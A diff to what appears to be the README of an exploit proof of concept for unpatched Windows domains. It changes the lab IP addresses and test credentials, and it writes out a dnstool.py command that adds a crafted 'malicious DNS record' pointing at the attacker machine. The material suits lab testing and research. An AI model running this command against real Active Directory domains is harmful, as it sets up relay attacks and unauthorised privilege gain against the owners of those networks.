@@ -16,9 +16,9 @@ Windows Server 2025 (versions without KB5048685)
 
 | Role | OS | IP Address | Requirements |
 |------|----|-----------|----|
-| Domain Controller | Windows Server 2019/2022 | 192.168.214.134 | AD DS + DNS services |
-| Target/Victim | Windows 10/11/Server | 192.168.214.135 | Domain-joined |
-| Attacker | Kali Linux/Ubuntu | 192.168.214.129 | Penetration tools |
+| Domain Controller | Windows Server 2019/2022 | 192.168.2.1 | AD DS + DNS services |
+| Target/Victim | Windows 10/11/Server | 192.168.2.3 | Domain-joined |
+| Attacker | Kali Linux/Ubuntu | 192.168.2.5 | Penetration tools |
 
 **Domain Configuration**:  
 Domain regular user account: test.com\test1  
@@ -26,12 +26,10 @@ Password: Test..111
 
 # Usage
 
-## Step 1: Add Malicious DNS Record
+## Step 1: Add Malicious DNS Record  
+use dnstool.py  
 ```bash
-python3 dnstool.py -u 'luckytom.com\domainuser01' -p 'User01!@#' \
-  -r evilhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-  -d 192.168.214.129 \
-  --action add 192.168.214.134
+python dnstool.py -u 'test.com\test1' -p 'Test..111' -r win10pc1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 192.168.2.5 --action add 192.168.2.1
 ```
 
 **Parameters**:
